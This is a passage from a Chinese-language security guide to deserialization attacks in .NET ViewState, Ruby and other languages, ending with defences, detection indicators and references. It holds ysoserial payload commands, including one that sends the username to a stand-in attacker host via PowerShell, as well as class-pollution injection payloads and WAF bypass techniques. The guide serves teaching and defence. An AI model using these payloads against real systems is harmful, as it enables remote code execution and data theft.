ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe -c iwr http://attacker/$env:UserName"
```

**Case 1.5 — ViewState 不在响应中**：服务端虽不发送 ViewState，但若接受 `__VIEWSTATE` 参数，仍可注入并利用。

**Case 2 — < .NET 4.5 + MAC + 无加密**：
```bash
# 先爆破 / 匹配 MachineKey
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <VIEWSTATE> --decrypt --purpose=viewstate --modifier=<VIEWSTATEGENERATOR>
# 或 Badsecrets
python examples/blacklist3r.py --viewstate <VIEWSTATE> --generator <VIEWSTATEGENERATOR>
# 生成签名载荷
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd" \
  --generator=<VALUE> --validationalg="SHA1" --validationkey="<KEY>"
```

**Case 3 — < .NET 4.5 + 加密**：去除 `__VIEWSTATEENCRYPTED` 参数即可发送**未加密已签名**载荷。

**Case 4 — ≥ .NET 4.5**：需要 path + apppath 参与材料派生：
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd" \
  --path="/content/default.aspx" --apppath="/" \
  --validationalg="HMACSHA256" --validationkey="<VALIDATION_KEY>" \
  --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>"
```

### 获取 MachineKey 的方法

1. **Blacklist3r / Badsecrets**：已知密钥爆破
2. **反射泄露**：上传 ASPX 读取 `MachineKeySection.GetApplicationConfig()`
3. **公开泄露密钥**（2025 年微软报告大规模利用）：扫描 GitHub/博客/StackOverflow 中复制的 `<machineKey>` 块
4. **横向重用**：Web 农场同密钥

### 2024-2025 实战案例

- **微软公开 MachineKey 大规模利用（2025.2）**：攻击者使用 `--minify` 和 `--islegacy` 标志压缩载荷绕过 WAF
- **CVE-2025-30406 (Gladinet CentreStack/Triofox)**：多个版本硬编码相同 `machineKey`，无需认证 RCE
- **SharePoint ToolShell (CVE-2025-53770/53771)**：通过 ASPX 反射泄露 `machineKey` 后伪造 ViewState

### WSUS 反序列化 (CVE-2025-59287)

Windows Server Update Services（TCP 8530/8531）的 `GetCookie()` 和 `ReportingWebService` 端点使用 BinaryFormatter/SoapFormatter 处理未认证的反序列化，获得 `NT AUTHORITY\SYSTEM` 权限。

---

# 0x07 Ruby 反序列化

## 7.1 Marshal.load — 内置反序列化

```ruby
Marshal.load(user_input)  # 危险
```

Marshal.dump / Marshal.load 是 Ruby 内置序列化，任意类实例化无类型白名单限制。

## 7.2 YAML (Psych) 反序列化

```ruby
YAML.load(user_input)  # Psych.load
```

支持 Ruby 对象标签（`!ruby/object:`, `!ruby/hash:`），可实例化任意类。

## 7.3 Oj / Ox — 高性能 JSON/XML 解析器

Oj 默认安全模式不实例化对象，但 `Oj.load(data, mode: :object)` 或 `Oj.object_load()` 支持对象类型标签。Ox 类似，在 `Ox.parse_obj` 模式下可反序列化任意 Ruby 对象。

## 7.4 Class Pollution — Ruby 的类属性污染

类似 JS Prototype Pollution 和 Python Class Pollution，通过递归 merge 操作污染类变量。

### 实例属性污染 → 权限提升 / RCE

```ruby
# 通过 merge 注入 to_s 属性绕过 authorize
ruby class_pollution.rb '{"to_s":"Admin","name":"Jane Doe",...}'

# 注入 protected_methods 属性 → instance_eval → RCE
ruby class_pollution.rb '{"protected_methods":["puts 1"],"name":"Jane Doe",...}'
```

### 类变量污染（通过 `class.superclass` 遍历）

```ruby
# 污染父类 Person 的 @@url 类变量
'{"class":{"superclass":{"url":"http://malicious.com"}}}'

# 污染任意类 KeySigner 的 @@signing_key 类变量（需暴力枚举 + 竞争）
'{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected"}}}}}}'
```

### Hashie 库特殊绕过

Hashie 的 `deep_merge` 阻止方法被属性替换，但**以 `_`、`!`、`?` 结尾的属性除外**。`_` 属性本身是例外项，可被注入：

```ruby
# Hashie Mash 对象绕过
{"_": "Admin", "name": "Jane Doe"}
# _.to_s == "Admin"  → 授权绕过
```

**Hashie 5.0.0 回归**（已修正于 5.0.1）：`deep_merge` 直接修改接收方而非复制，导致跨请求持久污染。

## 7.5 Rails `_json` 参数绕过

Rails 将请求体中的非标量值（如数组）打包进 `_json` 键。攻击者可显式传递 `_json` 键携带任意值，在同时检查参数真实性和使用 `_json` 执行操作的场景中实现授权绕过：

```json
{"id": 123, "_json": [456, 789]}
```

---

# 0x08 跨语言攻击链建模

## 8.1 各语言 Gadget 链类型对比

| 语言 | Gadget 原语 | 典型 Sink | 检测难度 |
|------|-----------|---------|---------|
| **PHP** | Magic Methods (`__destruct`, `__wakeup`) | `system()`, `file_put_contents()`, `unlink()` | 低 |
| **Python** | `__reduce__()` → (callable, args) | `os.system()`, `subprocess.Popen()` | 低 |
| **NodeJS** | Prototype Pollution → `child_process` env/cmdline | `fork()`, `execSync()` | 中 |
| **Java** | Transformer/Invoker 反射链 | `Runtime.exec()`, JNDI `lookup()` | 中 |
| **.NET** | ObjectDataProvider → Process.Start | `Process.Start()`, XAML 动态加载 | 中 |
| **Ruby** | Class Pollution → instance_eval | `system()`, `eval()` | 高 |

## 8.2 通用攻击链架构

```
[入口点]        →    [反序列化触发]    →    [Gadget 链]    →    [Sink]
文件上传 (.phar)  → file_exists()       → __destruct()    → system()
HTTP Cookie      → readObject()        → 反射调用链      → Runtime.exec()
POST body JSON   → Json.NET $type      → ODP.set_Method  → Process.Start
YAML config      → yaml.load(unsafe)   → __reduce__()    → subprocess.Popen
SSRF/Host Header → JNDI lookup         → LDAP 重定向     → 远程 class 加载
```

## 8.3 反序列化通用绕过技术

1. **编码混淆**：base64 变体、URL 编码、十六进制编码载荷中的类名/方法名
2. **协议走私**：HTTP/2 多路复用 + 路径混淆绕过 WAF
3. **类型走私**：JSON/XML 多态类型声明（$type / xsi:type / !!python/object）
4. **签名绕过**：空签名算法、算法降级攻击（如 SHA1withDSA → none）
5. **类路径污染**：操纵 classpath/autoload/require 解析路径加载恶意类
6. **沙箱逃逸**：通过 `__globals__` / `__subclasses__()` / prototype chain 逃逸到全局作用域

---

# 0x09 检测与防御

## 9.1 各语言防护方案

### PHP
```ini
; 禁止反序列化不可信类
; PHP 7.0+ unserialize options
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);
; 禁用 phar 流包装器（极端措施）
disable_functions = file_exists,is_file,is_dir,...  # 不推荐，影响大
```

### Python
```python
# 使用安全 Loader
yaml.safe_load(data)        # 仅纯 YAML 数据类型
pickle.loads(data)  # NEVER use on untrusted data — 无安全替代方案
# Pickle 替代: JSON/MessagePack/Protobuf
```

### NodeJS
```javascript
// 冻结原型
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
// 使用 structuredClone（不遍历原型链）
structuredClone(data);
// 使用 Map 替代 {} 存储键值对
const cache = new Map();
// 安全的深度合并 — lodash ≥ 4.17.22 / deepmerge ≥ 5.3.0
```

### Java
```bash
# JEP 290 / JEP 415 序列化过滤
-Djdk.serialFilter="com.example.dto.*;java.base/*;maxdepth=5;maxrefs=1000;maxbytes=16384;!*"
```
```java
// 按流设置过滤
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.dto.*;java.base/*;maxdepth=5;!*"
);
ois.setObjectInputFilter(filter);
```

### .NET
```csharp
// 使用 SerializationBinder 限制类型
sealed class SafeBinder : SerializationBinder {
    public override Type BindToType(string assemblyName, string typeName) {
        // 白名单验证
    }
}
// JSON.NET — 禁用 TypeNameHandling
JsonConvert.DeserializeObject<T>(json);  // 不传 TypeNameHandling.All/Objects
// BinaryFormatter — 安全替代: Protobuf / MessagePack / System.Text.Json
```

### Ruby
```ruby
# YAML — 安全加载
YAML.safe_load(data)  # Psych 3.0+
# Marshal — 绝不用于不可信数据
# 替代: JSON.parse / MessagePack
```

## 9.2 检测规则

**流量侧 IOCs**：
- HTTP 请求中的 Java 序列化魔术字节：`ac ed 00 05`
- .NET BinaryFormatter 魔术字节：`00 01 00 00 00 FF FF FF FF`
- PHP 序列化模式：`O:\d+:`
- YAML 中的 Python 对象标签：`!!python/object/apply:` 和 `!!python/object/new:`
- JSON 中的 `$type` / `__proto__` / `constructor.prototype` 键
- JNDI Lookup 注入模式：`${jndi:`, `${jndi:ldap://`, `${jndi:rmi://`

**日志侧 IOCs**：
- `java.io.ObjectInputStream.readObject` 堆栈跟踪
- `java.security.SignedObject.getObject` 堆栈跟踪
- `ClassNotFoundException` 在反序列化上下文中出现
- 未预期类名出现在错误消息中（Gadget 类名如 `ChainedTransformer`, `ObjectDataProvider`, `Stripe\StripeObject`）

## 9.3 安全开发实践

1. **绝不信任序列化数据** — 将其视为与 SQL 查询参数等价的不可信输入
2. **使用数据格式而非对象格式** — JSON Schema / Protobuf / Avro，不携带类型信息
3. **加密 ≠ 安全** — 签名/加密保护机密性但不限制可反序列化的类型
4. **签名验证是必要条件非充分条件** — 见 CVE-2025-10035 SignedObject 门控案例
5. **保持 readObject/readResolve/构造函数简单** — 仅做字段读取 + 不变量检查，不做 I/O、方法调用
6. **全网 MachineKey/Secret Key 轮换** — 防止一次泄露波及面过大
7. **错误处理路径与正常路径同等安全审计** — 预认证 Token 生成、会话初始化等错误路径常被忽视

---

## References

- [PHPGGC](https://github.com/ambionics/phpggc)
- [ysoserial](https://github.com/frohoff/ysoserial)
- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [YSoNet](https://github.com/irsdl/ysonet)
- [GadgetProbe](https://github.com/BishopFox/GadgetProbe)
- [marshalsec](https://github.com/mbechler/marshalsec)
- [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)
- [Blacklist3r / Badsecrets](https://github.com/blacklanternsecurity/badsecrets)
- [Livepyre](https://github.com/synacktiv/Livepyre)
- [laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)
- [PortSwigger — Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [PortSwigger — Widespread Prototype Pollution Gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [PortSwigger — HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
- [Synacktiv — Livewire RCE through Unmarshaling](https://www.synacktiv.com/en/publications/livewire-remote-command-execution-through-unmarshaling)
- [Doyensec — Class Pollution in Ruby](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)
- [Abdulrah33m — Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [watchTowr — GoAnywhere CVE-2025-10035](https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/)
- [Microsoft — Code Injection Using Publicly Disclosed ASP.NET Machine Keys (Feb 2025)](https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/)
- [Unit 42 — WSUS CVE-2025-59287](https://unit42.paloaltonetworks.com/microsoft-cve-2025-59287/)
- [Kudelski — Gladinet CentreStack/Triofox RCE CVE-2025-30406](https://research.kudelskisecurity.com/2025/04/16/gladinet-centrestack-and-gladinet-triofox-critical-rce-cve-2025-30406/)
- [Positive Technologies — Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [CVE-2025-54068 — Livewire v3 RCE Advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)
- [PHP Internals — phar:// Stream Wrapper Deserialization](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
- [Google CTF 2022 Log4j2 Writeup](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
- [Check Point — Ink Dragon: Relay Network and Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [SharePoint ToolShell Exploitation Chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [watchTowr — Sitecore XP Cache Poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
